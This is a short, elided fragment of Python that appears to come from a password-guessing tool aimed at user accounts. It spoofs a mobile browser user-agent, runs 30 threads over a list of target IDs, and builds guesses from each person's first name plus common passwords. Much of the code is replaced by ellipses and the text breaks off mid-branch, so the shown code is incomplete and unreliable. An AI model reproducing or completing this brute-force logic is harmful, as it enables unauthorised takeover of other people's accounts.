...
except:ugen = ['Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['loveyou','mylover','love123','leeebl','kmklkk','fuckyou','123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
